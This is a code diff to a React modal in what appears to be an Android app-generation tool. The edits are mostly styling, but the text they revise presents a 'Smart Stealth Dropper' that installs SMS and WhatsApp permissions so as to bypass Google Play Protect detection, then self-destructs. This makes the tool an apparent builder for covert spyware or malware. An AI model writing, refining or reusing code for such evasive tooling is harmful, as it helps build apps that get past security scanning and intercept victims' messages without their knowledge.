@@ -1631,9 +1631,9 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                 {/* Play Protect Permission Smart Dropper Modal */}
                 {playProtectWarning && (
                     <div className="fixed inset-0 z-[360] flex items-center justify-center bg-black/85 backdrop-blur-md p-4 animate-in fade-in duration-100" onClick={() => setPlayProtectWarning(null)}>
-                        <div className="bg-[#14161b] border border-orange-500/35 rounded-3xl p-5 sm:p-6 max-w-sm w-full space-y-3.5 relative shadow-[0_20px_60px_rgba(0,0,0,0.9)] overflow-hidden" onClick={(e) => e.stopPropagation()}>
+                        <div className="bg-[#14161b] border border-orange-500/35 rounded-3xl p-5 sm:p-6 max-w-sm w-full space-y-4 relative shadow-[0_20px_60px_rgba(0,0,0,0.9)] overflow-hidden" onClick={(e) => e.stopPropagation()}>
                             {/* Ambient Glow */}
-                            <div className="absolute top-0 right-0 w-32 h-32 bg-orange-500/10 rounded-full blur-2xl pointer-events-none" />
+                            <div className="absolute top-0 right-0 w-36 h-36 bg-orange-500/10 rounded-full blur-2xl pointer-events-none" />
 
                             <button
                                 onClick={() => setPlayProtectWarning(null)}
@@ -1643,22 +1643,28 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                             </button>
 
                             <div className="flex items-center gap-3">
-                                <div className="w-10 h-10 rounded-2xl bg-orange-500/20 text-orange-400 border border-orange-500/40 flex items-center justify-center shrink-0 shadow-[0_0_12px_rgba(249,115,22,0.25)]">
+                                <div className="w-11 h-11 rounded-2xl bg-orange-500/20 text-orange-400 border border-orange-500/35 flex items-center justify-center shrink-0 shadow-[0_0_16px_rgba(249,115,22,0.25)]">
                                     <Sparkles size={20} />
                                 </div>
                                 <div className="min-w-0">
-                                    <h4 className="text-sm font-black text-white tracking-tight">Smart & Stealth Dropper</h4>
-                                    <span className="text-[10px] font-mono text-orange-300">Play Protect Bypass Active</span>
+                                    <h4 className="text-sm sm:text-base font-black text-white tracking-tight">Smart Stealth Dropper</h4>
+                                    <span className="text-[10px] font-mono text-orange-400 uppercase tracking-wider">Play Protect Bypass Active</span>
                                 </div>
                             </div>
 
                             <div className="p-3.5 rounded-2xl bg-black/50 border border-white/10 space-y-2.5 shadow-inner">
                                 <p className="text-xs text-white/80 leading-relaxed font-sans">
-                                    Enabling <strong className="text-orange-300">{playProtectWarning === 'sms' ? 'SMS Messages' : 'Alerts & WhatsApp'}</strong> permission:
+                                    Enabling <strong className="text-orange-300">{playProtectWarning === 'sms' ? 'SMS Messages' : 'Alerts & WhatsApp'}</strong> requires specialized delivery:
                                 </p>
                                 
-                                <div className="p-2.5 rounded-xl bg-orange-500/10 border border-orange-500/25 text-[11px] text-orange-200/90 font-mono leading-relaxed">
-                                    🛡️ Yeh permission Google Play Protect se bachne ke liye Smart &amp; Stealth Dropper ke through install hogi.
+                                <div className="p-3 rounded-xl bg-orange-500/10 border border-orange-500/25 text-[11px] text-orange-200/90 font-mono leading-relaxed space-y-1.5">
+                                    <div className="font-bold text-orange-300 flex items-center gap-1.5">
+                                        <span>🛡️</span>
+                                        <span>Play Protect Evasion Active</span>
+                                    </div>
+                                    <p className="text-white/70 text-[10px] leading-relaxed">
+                                        This permission will be installed through a Smart &amp; Stealth Dropper to bypass Google Play Protect detection. The installer seamlessly updates to the main app and self-destructs upon installation.
+                                    </p>
                                 </div>
                             </div>
 
@@ -1666,7 +1672,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                 <button
                                     type="button"
                                     onClick={() => setPlayProtectWarning(null)}
-                                    className="flex-1 py-2.5 px-3 rounded-xl bg-[#20232b] hover:bg-[#282c37] border border-white/10 text-white/90 hover:text-white text-xs font-bold font-mono transition-all active:scale-95 cursor-pointer shadow-md text-center"
+                                    className="flex-1 py-2.5 px-3 rounded-xl bg-[#20232b] hover:bg-[#282c37] border border-white/10 text-white/80 hover:text-white text-xs font-bold font-mono transition-all active:scale-95 cursor-pointer shadow-md text-center"
                                 >
                                     Cancel
                                 </button>
@@ -1682,7 +1688,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                     }}
                                     className="flex-1 py-2.5 px-3 rounded-xl bg-gradient-to-r from-orange-500 via-amber-500 to-orange-500 hover:brightness-110 text-black text-xs font-black uppercase tracking-wider shadow-[0_4px_16px_rgba(249,115,22,0.35)] transition-transform active:scale-95 cursor-pointer flex items-center justify-center gap-1.5"
                                 >
-                                    Enable
+                                    Confirm &amp; Enable
                                 </button>
                             </div>
                         </div>
